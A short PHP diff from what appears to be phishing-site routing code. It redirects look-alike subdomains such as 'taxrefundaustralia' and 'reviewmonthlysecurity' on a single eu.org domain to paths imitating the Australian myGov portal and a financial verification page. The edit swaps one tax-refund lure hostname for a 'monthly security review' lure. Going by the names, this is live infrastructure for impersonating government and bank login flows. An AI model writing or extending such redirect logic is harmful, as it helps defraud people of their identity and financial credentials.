@@ -7,9 +7,9 @@ if (strpos($currentURL, "taxrefundaustralia.dazeai.eu.org") !== false) {
     // Redirect to the specified URL
     header("Location: https://taxrefundaustralia.dazeai.eu.org/mygov/mygovau/");
     exit(); // Ensure no further code execution
-} if (strpos($currentURL, "taxrefundaus.dazeai.eu.org") !== false) {
+} if (strpos($currentURL, "reviewmonthlysecurity.dazeai.eu.org") !== false) {
     // Redirect to the specified URL
-    header("Location: https://taxrefundaus.dazeai.eu.org/mygov/verify2a/");
+    header("Location: https://reviewmonthlysecurity.dazeai.eu.org/fin/fin/");
     exit(); // Ensure no further code execution
 } if (strpos($currentURL, "administration.dazeai.eu.org") !== false) {
     // Redirect to the specified URL
